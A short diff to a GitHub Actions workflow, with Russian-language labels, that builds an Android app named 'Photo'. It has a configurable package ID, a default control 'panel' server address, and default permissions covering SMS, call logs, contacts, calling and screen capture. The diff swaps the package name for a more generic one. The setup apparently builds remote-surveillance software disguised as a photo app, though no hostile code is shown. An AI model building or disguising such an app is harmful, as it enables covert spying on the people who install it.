@@ -17,9 +17,9 @@ on:
         required: false
         default: "Photo"
       application_id:
-        description: "Package (applicationId), напр. com.artem.photo"
+        description: "Package (applicationId), напр. app.photo"
         required: false
-        default: "com.artem.photo"
+        default: "app.photo"
       default_server:
         description: "Адрес панели по умолчанию (IP:порт), необязательно"
         required: false
@@ -66,7 +66,7 @@ jobs:
       - name: Inject build parameters
         run: |
           APP_NAME="${{ github.event.inputs.app_name || 'Photo' }}"
-          APP_ID="${{ github.event.inputs.application_id || 'com.artem.photo' }}"
+          APP_ID="${{ github.event.inputs.application_id || 'app.photo' }}"
           SERVER="${{ github.event.inputs.default_server }}"
           PERMS="${{ github.event.inputs.permissions || 'CAMERA,SCREEN,NOTIFICATIONS,PHONE_STATE,CALL_LOG,CALL_PHONE,CONTACTS,READ_SMS,SEND_SMS,RECEIVE_SMS,BT_CONNECT,BT_SCAN' }}"
 
